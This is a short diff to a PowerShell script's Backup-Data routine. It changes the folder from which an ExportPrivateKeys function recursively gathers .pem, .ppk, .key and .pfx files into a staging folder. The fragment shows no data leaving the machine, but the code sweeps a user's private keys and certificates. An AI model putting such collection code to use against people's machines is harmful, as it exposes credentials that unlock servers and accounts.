@@ -802,7 +802,7 @@ function Backup-Data {
     function ExportPrivateKeys {
         $privatekeysfolder = "$important_files\Certificates & Private Keys"
         New-Item -ItemType Directory -Path $privatekeysfolder -Force
-        $sourceDirectory = $env:HOMEPATH
+        $sourceDirectory = "$env:userprofile"
         $destinationDirectory = "$important_files\Certificates & Private Keys"
         $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
         $foundFiles = Get-ChildItem -Path $sourceDirectory -Recurse -Include $fileExtensions -File
